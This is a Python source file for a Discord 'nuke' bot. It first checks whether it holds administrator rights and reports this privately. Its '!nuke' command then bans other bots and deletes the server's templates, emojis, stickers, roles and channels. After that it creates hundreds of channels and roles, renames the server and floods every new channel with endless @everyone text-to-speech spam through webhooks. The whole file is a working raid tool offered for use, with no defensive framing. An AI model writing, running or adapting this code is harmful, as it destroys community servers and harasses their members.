from discord.ext import commands
import discord
import asyncio
from dotenv import load_dotenv
import os

load_dotenv()

channel_name = os.getenv("CHANNEL_NAME") 
role_name = os.getenv("ROLE_NAME")
server_name = os.getenv("SERVER_NAME")
webhook_name = os.getenv("WEBHOOK_NAME")
message = os.getenv("MESSAGE")
token = os.getenv("TOKEN")

bot = commands.Bot(command_prefix="!", intents=discord.Intents.all())

@bot.event 
async def on_ready():
    print("Bot ready.")

@bot.command()
async def nuke(ctx):
    await ctx.message.delete()
    
    for member in ctx.guild.members:
        if member.bot and member != ctx.guild.me:
            try:
                await member.ban(reason="Nuked")
                await asyncio.sleep(0.5)
            except:
                pass

    if ctx.guild.templates:
        templates = await ctx.guild.templates()
        for template in templates:
            try:
                await template.delete()
                await asyncio.sleep(0.5)
            except:
                pass

    for emoji in ctx.guild.emojis:
        try:
            await emoji.delete()
            await asyncio.sleep(0.5)
        except:
            pass

    for sticker in ctx.guild.stickers:
        try:
            await sticker.delete()
            await asyncio.sleep(0.5)
        except:
            pass
                                  
    for role in ctx.guild.roles:
        if role != ctx.guild.default_role and role != ctx.guild.me.top_role:
            try:
                await role.delete()
                await asyncio.sleep(0.1)
            except:
                pass
    
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
            await asyncio.sleep(0.1)
        except:
            pass
    
    for _ in range(500):
        try:
            await ctx.guild.create_text_channel(channel_name)
            await ctx.guild.create_role(name=role_name)
        except:
            pass

@bot.command() 
async def check(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    
    if guild:
        bot_member = guild.me
        if bot_member.guild_permissions.administrator:
            await ctx.author.send("Has administrator permissions")
        else:
            await ctx.author.send("No administrator permissions")
    else:
        await ctx.author.send("This command only works in servers")

@bot.event
async def on_guild_channel_create(channel):
    if channel.name == channel_name:
        try:
            await channel.guild.edit(name=server_name)
            webhooks = []
            for _ in range(2):
                webhook = await channel.create_webhook(name=webhook_name)
                webhooks.append(webhook)
            
            while True:
                tasks = []
                for webhook in webhooks:
                    for _ in range(5):
                        tasks.append(channel.send(f"@everyone @here\n{message}", tts=True))
                        tasks.append(webhook.send(f"@everyone @here\n{message}", tts=True))
                await asyncio.gather(*tasks)
                
        except discord.errors.Forbidden:
            pass

bot.run(token)
